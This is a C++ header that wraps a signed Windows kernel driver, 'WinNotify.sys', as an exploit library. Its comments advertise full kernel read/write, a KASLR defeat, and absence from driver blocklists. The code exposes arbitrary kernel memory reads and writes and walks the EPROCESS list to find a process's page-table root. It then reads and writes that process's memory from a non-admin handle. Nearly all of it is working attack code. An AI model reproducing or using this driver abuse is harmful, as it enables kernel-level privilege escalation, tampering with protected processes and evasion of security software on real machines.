#pragma once
// WinNotify.sys (signeddrv.sys) IOCTL wrapper -- full kernel R/W
//
// Device:      \\.\WinNotify
// IOCTLs:      0x22200C  Module base (KASLR defeat)
//              0x222040  Kernel read  (5 QWORDs from kernel VA)
//              0x222044  Kernel write (memmove, zero validation)
//              0x222000  CR3-based read  (VA + DirBase -> driver walks page tables)
//              0x222004  CR3-based write (VA + DirBase -> driver walks page tables)
//
// LOLDrivers:  NOT listed.  MS blocklist: NOT listed.  CVE: none.
// Signer:      WHCP (Authenticode). No admin required to open handle.
//
// For cross-process R/W: use CR3-based IOCTLs (0x222000/0x222004)
//   1. Get kernel base via 0x22200C
//   2. Walk EPROCESS list via 0x222040 kernel reads
//   3. Read target's DTB (CR3) from EPROCESS+0x28
//   4. Pass target VA + target CR3 to 0x222000/0x222004

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#ifndef NOMINMAX
#define NOMINMAX
#endif
#include <Windows.h>
#include <cstdint>
#include <cstring>
#include <algorithm>

namespace winnotify {

// ── IOCTL codes ────────────────────────────────────────────

constexpr DWORD IOCTL_MODULE_BASE  = 0x22200C;  // kernel/module base
constexpr DWORD IOCTL_KREAD        = 0x222040;   // 5-QWORD kernel VA read
constexpr DWORD IOCTL_KWRITE       = 0x222044;   // memmove kernel VA write
constexpr DWORD IOCTL_CR3_READ     = 0x222000;   // CR3-based read
constexpr DWORD IOCTL_CR3_WRITE    = 0x222004;   // CR3-based write

// ── Buffer layouts ─────────────────────────────────────────

// IOCTL 0x22200C -- module base resolution
// Input:  0x18 bytes.  Output: 0x20 bytes (base at +0x10)
#pragma pack(push, 1)
struct ModuleBaseInput {
    uint64_t name_ptr;   // +0x00  pointer to module name string
    uint64_t unused;     // +0x08
    uint64_t reserved;   // +0x10
};
struct ModuleBaseOutput {
    uint64_t pad1;       // +0x00
    uint64_t pad2;       // +0x08
    uint64_t base;       // +0x10  module base address
    uint64_t pad3;       // +0x18
};

// IOCTL 0x222040 -- kernel VA read (5 QWORDs)
// Shared in/out buffer, 0x38 bytes
// Guard: *(base+offset+0x10) must be non-zero or driver skips output.
// Workaround: pass (addr - 0x10) as base so target value lands at +0x10.
struct KReadBuffer {
    uint64_t base;       // +0x00  kernel VA base
    uint64_t offset;     // +0x08  added to base
    uint64_t val0;       // +0x10  *(base+offset+0x00) -- guard slot
    uint64_t val1;       // +0x18  *(base+offset+0x08)
    uint64_t val2;       // +0x20  *(base+offset+0x10)
    uint64_t val3;       // +0x28  *(base+offset+0x18)
    uint64_t val4;       // +0x30  *(base+offset+0x20)
};

// IOCTL 0x222044 -- kernel VA write (memmove)
// Input: 0x18 bytes.  No output.
struct KWriteInput {
    uint64_t src;        // +0x00  user-mode buffer (data source)
    uint64_t size;       // +0x08  bytes to write
    uint64_t dst;        // +0x10  kernel VA destination
};

// IOCTLs 0x222000 / 0x222004 -- CR3-based read/write
// Input: 0x28 bytes
struct Cr3IoInput {
    uint32_t flags;      // +0x00  (typically 0)
    uint32_t pad;        // +0x04  alignment
    uint64_t va;         // +0x08  target virtual address
    uint64_t user_buf;   // +0x10  user buffer (output for read, input for write)
    uint64_t size;       // +0x18  bytes
    uint64_t cr3;        // +0x20  DirBase (page table root)
};
#pragma pack(pop)

class Driver {
    HANDLE m_dev = INVALID_HANDLE_VALUE;

public:
    Driver() = default;
    ~Driver() { Close(); }
    Driver(const Driver&) = delete;
    Driver& operator=(const Driver&) = delete;

    // ── Device management ──────────────────────────────────

    bool Open() {
        m_dev = CreateFileW(L"\\\\.\\WinNotify",
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
        return m_dev != INVALID_HANDLE_VALUE;
    }

    void Close() {
        if (m_dev != INVALID_HANDLE_VALUE) {
            CloseHandle(m_dev);
            m_dev = INVALID_HANDLE_VALUE;
        }
    }

    bool Valid() const { return m_dev != INVALID_HANDLE_VALUE; }
    HANDLE Handle() const { return m_dev; }

    // ── IOCTL 0x22200C: module base ────────────────────────

    uint64_t GetModuleBase(const char* module_name) const {
        ModuleBaseInput in{};
        in.name_ptr = reinterpret_cast<uint64_t>(module_name);

        ModuleBaseOutput out{};
        DWORD br = 0;
        if (!DeviceIoControl(m_dev, IOCTL_MODULE_BASE,
                &in, sizeof(in), &out, sizeof(out), &br, nullptr))
            return 0;
        return out.base;
    }

    uint64_t GetKernelBase() const {
        return GetModuleBase("ntoskrnl.exe");
    }

    // ── IOCTL 0x222040: kernel VA read ─────────────────────
    // Reads 5 QWORDs starting at (base + offset).
    // The driver only writes output if the value at slot +0x10 is non-zero.

    bool KernelRead5(uint64_t base, uint64_t offset, uint64_t out[5]) const {
        KReadBuffer buf{};
        buf.base = base;
        buf.offset = offset;

        KReadBuffer result{};
        DWORD br = 0;
        if (!DeviceIoControl(m_dev, IOCTL_KREAD,
                &buf, sizeof(buf), &result, sizeof(result), &br, nullptr))
            return false;

        out[0] = result.val0;
        out[1] = result.val1;
        out[2] = result.val2;
        out[3] = result.val3;
        out[4] = result.val4;
        return true;
    }

    // Read a single QWORD from a kernel VA.
    // base=(kva-0x10), offset=0 puts the guard at val0=*(kva-0x10) and
    // the target at val2=*(kva-0x10+0x10)=*(kva).
    uint64_t ReadKernelQWORD(uint64_t kva) const {
        uint64_t vals[5]{};
        if (!KernelRead5(kva - 0x10, 0, vals))
            return 0;
        return vals[2];
    }

    // Bulk kernel VA read, 8 bytes at a time via the 5-QWORD primitive.
    bool ReadKernelVA(uint64_t kva, void* buf, size_t size) const {
        auto* dst = static_cast<uint8_t*>(buf);
        size_t off = 0;
        while (off < size) {
            uint64_t vals[5]{};
            if (!KernelRead5(kva + off - 0x10, 0, vals)) {
                memset(dst + off, 0, (std::min<size_t>)(8, size - off));
                off += 8;
                continue;
            }
            size_t to_copy = (std::min<size_t>)(8, size - off);
            memcpy(dst + off, &vals[2], to_copy);
            off += 8;
        }
        return true;
    }

    // ── IOCTL 0x222044: kernel VA write ────────────────────

    bool WriteKernelVA(uint64_t kva, const void* data, size_t size) const {
        KWriteInput in{};
        in.src = reinterpret_cast<uint64_t>(data);
        in.size = size;
        in.dst = kva;

        DWORD br = 0;
        return DeviceIoControl(m_dev, IOCTL_KWRITE,
            &in, sizeof(in), nullptr, 0, &br, nullptr) != FALSE;
    }

    // ── IOCTL 0x222000: CR3-based read ─────────────────────
    // Read from a virtual address in an arbitrary address space (identified by CR3).
    // For cross-process: pass the target process's DirectoryTableBase.

    bool Cr3Read(uint64_t cr3, uint64_t va, void* buf, size_t size) const {
        Cr3IoInput in{};
        in.flags = 0;
        in.va = va;
        in.user_buf = reinterpret_cast<uint64_t>(buf);
        in.size = size;
        in.cr3 = cr3;

        DWORD br = 0;
        return DeviceIoControl(m_dev, IOCTL_CR3_READ,
            &in, sizeof(in), nullptr, 0, &br, nullptr) != FALSE;
    }

    // ── IOCTL 0x222004: CR3-based write ────────────────────

    bool Cr3Write(uint64_t cr3, uint64_t va, const void* data, size_t size) const {
        Cr3IoInput in{};
        in.flags = 0;
        in.va = va;
        in.user_buf = reinterpret_cast<uint64_t>(data);
        in.size = size;
        in.cr3 = cr3;

        DWORD br = 0;
        return DeviceIoControl(m_dev, IOCTL_CR3_WRITE,
            &in, sizeof(in), nullptr, 0, &br, nullptr) != FALSE;
    }

    // ── Cross-process virtual memory R/W ───────────────────
    // These are the high-level APIs. Pass the target's DTB (from EPROCESS+0x28).

    bool ReadProcessMemory(uint64_t dtb, uint64_t va, void* buf, size_t size) const {
        return Cr3Read(dtb, va, buf, size);
    }

    bool WriteProcessMemory(uint64_t dtb, uint64_t va, const void* data, size_t size) const {
        return Cr3Write(dtb, va, data, size);
    }

    // ── EPROCESS walk: find process by PID ─────────────────
    // Uses kernel VA reads (0x222040) to walk ActiveProcessLinks.

    struct ProcessInfo {
        uint64_t eprocess;
        uint64_t dtb;
    };

    ProcessInfo FindProcess(DWORD target_pid) const {
        uint64_t ntos = GetKernelBase();
        if (!ntos) return { 0, 0 };

        // PsInitialSystemProcess
        // Read the export table to find its address
        uint8_t hdr[0x1000]{};
        if (!ReadKernelVA(ntos, hdr, sizeof(hdr)))
            return { 0, 0 };

        uint32_t pe_off;
        memcpy(&pe_off, hdr + 0x3C, 4);
        uint32_t exp_rva, exp_sz;
        memcpy(&exp_rva, hdr + pe_off + 0x88, 4);
        memcpy(&exp_sz,  hdr + pe_off + 0x8C, 4);
        if (!exp_rva || exp_sz > 0x100000) return { 0, 0 };

        auto exp = std::make_unique<uint8_t[]>(exp_sz);
        if (!ReadKernelVA(ntos + exp_rva, exp.get(), exp_sz))
            return { 0, 0 };

        uint32_t n_names, a_rva, n_rva, o_rva;
        memcpy(&n_names, exp.get() + 0x18, 4);
        memcpy(&a_rva,   exp.get() + 0x1C, 4); a_rva -= exp_rva;
        memcpy(&n_rva,   exp.get() + 0x20, 4); n_rva -= exp_rva;
        memcpy(&o_rva,   exp.get() + 0x24, 4); o_rva -= exp_rva;

        uint64_t psip_va = 0;
        const char target_name[] = "PsInitialSystemProcess";
        for (uint32_t i = 0; i < n_names; i++) {
            uint32_t nr;
            memcpy(&nr, exp.get() + n_rva + i * 4, 4);
            nr -= exp_rva;
            if (nr + sizeof(target_name) >= exp_sz) continue;
            if (memcmp(exp.get() + nr, target_name, sizeof(target_name)) == 0) {
                uint16_t ordinal;
                memcpy(&ordinal, exp.get() + o_rva + i * 2, 2);
                uint32_t func_rva;
                memcpy(&func_rva, exp.get() + a_rva + ordinal * 4, 4);
                psip_va = ntos + func_rva;
                break;
            }
        }
        if (!psip_va) return { 0, 0 };

        uint64_t sys_ep = ReadKernelQWORD(psip_va);
        if (!sys_ep || (sys_ep >> 48) < 0xFFFF) return { 0, 0 };

        // Auto-detect EPROCESS offsets from SYSTEM (PID=4)
        uint8_t ep_data[0x800]{};
        if (!ReadKernelVA(sys_ep, ep_data, sizeof(ep_data)))
            return { 0, 0 };

        uint32_t off_pid = 0, off_links = 0;
        for (uint32_t o = 0x100; o < 0x600; o += 8) {
            uint64_t val;
            memcpy(&val, ep_data + o, 8);
            if (val == 4) {
                uint64_t nxt;
                memcpy(&nxt, ep_data + o + 8, 8);
                if (nxt > 0xFFFF000000000000ULL) {
                    off_pid = o;
                    off_links = o + 8;
                    break;
                }
            }
        }
        if (!off_pid) return { 0, 0 };

        // Walk ActiveProcessLinks
        uint64_t head = sys_ep + off_links;
        uint64_t flink;
        memcpy(&flink, ep_data + off_links, 8);
        uint64_t cur = flink;

        for (int i = 0; i < 500 && cur && cur != head; i++) {
            uint64_t ep = cur - off_links;
            uint64_t pid = 0;
            ReadKernelVA(ep + off_pid, &pid, 8);

            if (static_cast<DWORD>(pid) == target_pid) {
                uint64_t dtb = 0;
                ReadKernelVA(ep + 0x28, &dtb, 8);
                return { ep, dtb };
            }

            uint64_t next = 0;
            ReadKernelVA(cur, &next, 8);
            cur = next;
        }
        return { 0, 0 };
    }

    // ── Convenience: read a T from process memory ──────────

    template<typename T>
    T ReadProc(uint64_t dtb, uint64_t va) const {
        T val{};
        Cr3Read(dtb, va, &val, sizeof(T));
        return val;
    }

    template<typename T>
    bool WriteProc(uint64_t dtb, uint64_t va, const T& val) const {
        return Cr3Write(dtb, va, &val, sizeof(T));
    }
};

} // namespace winnotify
